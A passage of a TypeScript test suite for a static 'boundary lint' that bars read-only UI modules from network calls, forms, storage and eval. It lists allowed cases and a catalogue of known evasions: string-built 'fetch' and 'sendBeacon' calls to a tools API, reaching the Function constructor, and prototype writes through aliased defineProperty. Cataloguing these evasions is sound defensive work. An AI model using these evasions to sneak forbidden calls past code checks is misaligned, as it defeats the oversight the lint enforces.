    name: "a component imports a JSON file",
    plant: both(
      add("src/components/data.json", '{"fetch": "not code", "never": 1}\n'),
      add("src/components/Probe.ts", 'import data from "./data.json";\nexport const p = data;\n'),
    ),
  },
  {
    name: "a component imports an asset with a Vite query",
    plant: both(
      add("src/components/logo.svg", "<svg xmlns='http://www.w3.org/2000/svg'/>\n"),
      add("src/components/Probe.ts", 'import logo from "./logo.svg?url";\nexport const p = logo;\n'),
    ),
  },
  {
    name: "a read-only module's comments name forbidden APIs",
    plant: add(
      "src/components/Probe.ts",
      "// This never calls fetch, XMLHttpRequest, sendBeacon or new Request(...), and it renders\n" +
        "/* no <form>; it does not touch sessionStorage, localStorage, indexedDB, Worker or eval. */\n" +
        "export const p = 1; // import { callTool } from \"../api\";\n",
    ),
  },
  {
    name: "a read-only module's prose strings mention forbidden APIs",
    plant: add(
      "src/components/Probe.ts",
      'export const p = "Could not fetch the trace; no form was sent, no Worker was started.";\n',
    ),
  },
  {
    name: "a read-only module imports a type from src/api.ts",
    plant: add("src/components/Probe.ts", 'import type { StoredSession } from "../api";\nexport type P = StoredSession;\n'),
  },
  {
    name: "a read-only module names forbidden APIs only in types",
    plant: add(
      "src/components/Probe.ts",
      "export interface P {\n  fetch: typeof fetch;\n  w: Worker;\n}\nexport type F = Function;\n",
    ),
  },
  {
    name: "a read-only module indexes a global with a literal key",
    plant: add("src/components/Probe.ts", 'export const c = () => (globalThis as any)["crypto"];\n'),
  },
  {
    name: "the loader uses every key on its allowlist",
    plant: edit(
      LOADER,
      'cache: "no-store",',
      'cache: "no-store",\n      signal: undefined,\n      redirect: "error",\n      mode: "same-origin",\n' +
        '      referrer: "",\n      referrerPolicy: "no-referrer",\n      integrity: "",\n      priority: "low",',
    ),
  },
  {
    name: "a module indexes its own frames, parent and top bindings with computed keys",
    plant: add(
      "src/components/Probe.ts",
      'const frames = ["a", "b"];\nexport const f = (i: number) => frames[i];\n' +
        "export const g = (parent: Record<string, number>, k: string) => parent[k];\n" +
        "export const h = (k: string) => {\n  const top: Record<string, number> = {};\n  return top[k];\n};\n",
    ),
  },
  {
    name: "strings only contain a tag name or the word javascript",
    plant: add(
      "src/components/Probe.tsx",
      'export const P = () => <p className="form-row" title="Fill in the form; no javascript here">transcript</p>;\n' +
        'export const s = ["formal", "iframes", "scripted", "javascript", "javascript is off"];\n',
    ),
  },
  {
    name: "a component imports a relative module named http",
    plant: both(
      add("src/components/helpers/http.ts", "export const h = 1;\n"),
      add("src/components/Probe.ts", 'import { h } from "./helpers/http";\nexport const p = h;\n'),
    ),
  },
  {
    name: "a module reads prototypes and globals, and writes only its own objects",
    plant: add(
      "src/components/Probe.ts",
      "const slice = Array.prototype.slice;\n" +
        "export const isPlain = (x: object) => Object.getPrototypeOf(x) === Object.prototype;\n" +
        "export const title = () => `${document.title} ${window.location.hash}`;\n" +
        "export const merge = (a: Record<string, unknown>) => Object.assign({}, a, { b: 1 });\n" +
        "export const put = (m: Map<unknown, number>, el: HTMLElement) => {\n" +
        "  m.set(undefined, 1);\n" +
        '  el.textContent = "x";\n' +
        '  Reflect.set(el, "title", "y");\n' +
        "};\n" +
        "export const own = () => {\n" +
        "  const box = { n: 0 };\n" +
        "  box.n += 1;\n" +
        "  [box.n] = [2];\n" +
        "  return { box, slice };\n" +
        "};\n",
    ),
  },
  {
    name: "a module uses logical expressions on its own values and literal keys on globals",
    plant: add(
      "src/components/Probe.ts",
      'export const c = () => ((globalThis || {}) as any)["crypto"];\n' +
        "export const d = (a: Record<string, number>, b: Record<string, number>, k: string) => (a || b)[k];\n" +
        'export const e = () => (window["top"] as any)["length"];\n',
    ),
  },
  {
    name: "a component imports a clean .js module",
    plant: both(
      add("src/components/util.js", "export const twice = (n) => n * 2;\n"),
      add("src/components/util.d.ts", "export declare const twice: (n: number) => number;\n"),
      add("src/components/Probe.ts", 'import { twice } from "./util.js";\nexport const p = twice(2);\n'),
    ),
  },
  {
    name: "a component imports allowed assets plain, with ?url and with ?raw",
    plant: both(
      add("src/components/logo.png", "png"),
      add("src/components/notes.txt", "notes\n"),
      add("src/components/data.json", '{ "a": 1 }\n'),
      add(
        "src/components/Probe.ts",
        'import logo from "./logo.png";\nimport notes from "./notes.txt?url";\nimport raw from "./data.json?raw";\n' +
          "export const p = [logo, notes, raw];\n",
      ),
    ),
  },
  {
    name: "a component imports package subpaths",
    plant: add(
      "src/components/Probe.ts",
      'import { jsx } from "react/jsx-runtime";\nimport { createRoot } from "react-dom/client";\nexport const p = [jsx, createRoot];\n',
    ),
  },
  {
    name: "a component refers to an asset with new URL(..., import.meta.url)",
    plant: both(
      add("src/components/logo.svg", "<svg xmlns='http://www.w3.org/2000/svg'/>\n"),
      add(
        "src/components/Probe.ts",
        'export const a = new URL("./logo.svg", import.meta.url);\nexport const b = new URL("logo.svg", import.meta.url);\n' +
          'export const c = new URL("https://example.invalid/x", import.meta.url);\n',
      ),
    ),
  },
  {
    name: "a component imports a directory with an index file",
    plant: both(
      add("src/components/lib/index.ts", "export const one = 1;\n"),
      add("src/components/Probe.ts", 'import { one } from "./lib";\nexport const p = one;\n'),
    ),
  },
];

for (const c of ALLOWED) {
  test(`the boundary lint still passes when ${c.name}`, () => {
    const result = lint(c.plant);
    assert.deepEqual(result.problems, [], report(result));
  });
}

// Known evasions: code written to evade the lint that it does not catch. Each one is listed in
// the lint header and web/README.md; these cases keep that list accurate. Run-time enforcement
// (the walkthrough's non-GET check) is what stands behind them.
const KNOWN_EVASIONS: readonly Omit<Case, "expect">[] = [
  {
    name: "round-1 B16 as reported: an aliased globalThis indexed by a built-up name",
    plant: add(
      "src/components/Probe.ts",
      "const g = globalThis as unknown as Record<string, (u: string, i: object) => Promise<unknown>>;\n" +
        'export const p = () => g["fe" + "tch"]?.("/api/tools/apply_plan", { method: "POST" });\n',
    ),
  },
  {
    name: "a global object passed through an array",
    plant: add("src/components/Probe.ts", "export const p = (k: string) => ([window] as any)[0][k];\n"),
  },
  {
    name: "Reflect.get on window with a computed name",
    plant: add("src/components/Probe.ts", "export const p = (n: string) => Reflect.get(window, n);\n"),
  },
  {
    name: "a name assembled from strings and handed to a helper",
    plant: add(
      "src/components/Probe.ts",
      'export const p = () => Object.getOwnPropertyDescriptor(globalThis, "fe" + "tch");\n',
    ),
  },
  {
    name: "a string of code handed to setTimeout",
    plant: add("src/components/Probe.ts", 'export const p = () => setTimeout("void 0", 0);\n'),
  },
  {
    name: "the Function constructor reached through a variable",
    plant: add(
      "src/components/Probe.ts",
      "const id = () => 0;\nconst F = id.constructor;\nexport const p = () => new F();\n",
    ),
  },
  {
    // Round-3 T3.
    name: "the Function constructor called through .call",
    plant: add(
      "src/components/Probe.ts",
      'function h() {\n  return 0;\n}\nexport const p = () => (h.constructor as (...a: string[]) => () => unknown).call(0, "return 1")();\n',
    ),
  },
  {
    name: "a tag name built at run time",
    plant: add(
      "src/components/Probe.ts",
      'import { createElement } from "react";\nexport const p = () => createElement("fo" + "rm");\n',
    ),
  },
  {
    name: "a bare frames in a module that binds frames elsewhere",
    plant: add(
      "src/components/Probe.ts",
      "export const a = () => {\n  const frames = 0;\n  return frames;\n};\n" +
        "export const p = (k: string) => (frames as any)[k];\n",
    ),
  },
  {
    name: "a web API the rules do not name",
    plant: add("src/components/Probe.ts", 'export const p = () => document.write("<img src=x>");\n'),
  },
  {
    // Round-3 H1c: the page navigates to a same-origin blob: document whose script could fetch.
    name: "a blob: HTML document opened with location.assign",
    plant: add(
      "src/components/Probe.ts",
      'const html = "<p>x</p>";\n' +
        'export const p = () => location.assign(URL.createObjectURL(new Blob([html], { type: "text/html" })));\n',
    ),
  },
  {
    name: "a prototype held in a variable and written",
    plant: add(
      "src/components/Probe.ts",
      'const p = Object.prototype as Record<string, unknown>;\nexport const probe = () => {\n  p.body = "{}";\n};\n',
    ),
  },
  // Round-4 W11-W13: a mutator the write rule does not see by its own name.
  {
    name: "W11: a mutator called through .call",
    plant: add(
      "src/components/Probe.ts",
      'Object.defineProperty.call(null, Object.prototype, "body", { configurable: true, get: () => "{}" });\nexport {};\n',
    ),
  },
  {
    name: "W12: a mutator held in a variable of another name",
    plant: add(
      "src/components/Probe.ts",
      'const dp = Object.defineProperty;\ndp(Object.prototype, "body", { configurable: true, get: () => "{}" });\nexport {};\n',
    ),
  },
  {
    name: "W13: a mutator called through Reflect.apply",
    plant: add(
      "src/components/Probe.ts",
      'Reflect.apply(Object.defineProperty, null, [Object.prototype, "body", { configurable: true, get: () => "{}" }]);\n' +
        "export {};\n",
    ),
  },
  {
    name: "a global object passed through an object (e.view)",
    plant: add("src/components/Probe.ts", "export const p = (e: MouseEvent, k: string) => (e.view as any)[k];\n"),
  },
  {
    name: "G3: an ambient declare that shadows navigator",
    plant: add(
      "src/components/Probe.ts",
      "declare const navigator: Record<string, (u: string, d: string) => boolean>;\n" +
        'const k = "send" + "Beacon";\n' +
        'export const p = () => navigator[k]?.("/api/tools/apply_plan", "{}");\n',
    ),
  },
  {
    name: "G3b: a parameter named document elsewhere in the module",
    plant: add(
      "src/components/Probe.ts",
      "export const q = (document: unknown) => document;\n" +
        'const k = "write";\n' +
        'export const p = () => (document as unknown as Record<string, (s: string) => void>)[k]?.("x");\n',
    ),
  },
];

for (const c of KNOWN_EVASIONS) {
  test(`the boundary lint does not catch the known evasion: ${c.name}`, () => {
    const result = lint(c.plant);
    assert.deepEqual(result.problems, [], report(result));
  });
}

test("the script exits 0 on a clean tree and 1 with the report on a violation", () => {
  const clean = spawnSync(process.execPath, [SCRIPT, copyWith(() => undefined)], { encoding: "utf-8" });
  assert.equal(clean.status, 0, `${clean.stdout}${clean.stderr}`);
  assert.match(clean.stdout, /^Boundary check passed: \d+ read-only modules, \d+ sources scanned\.$/m);

  const dirty = spawnSync(process.execPath, [SCRIPT, copyWith(ROUND_1_BYPASSES[0]?.plant ?? (() => undefined))], {
    encoding: "utf-8",
  });
  assert.equal(dirty.status, 1, `${dirty.stdout}${dirty.stderr}`);
  assert.ok(dirty.stderr.includes(`  - ${REACHES_API("src/board/Probe.ts")}`), dirty.stderr);
});
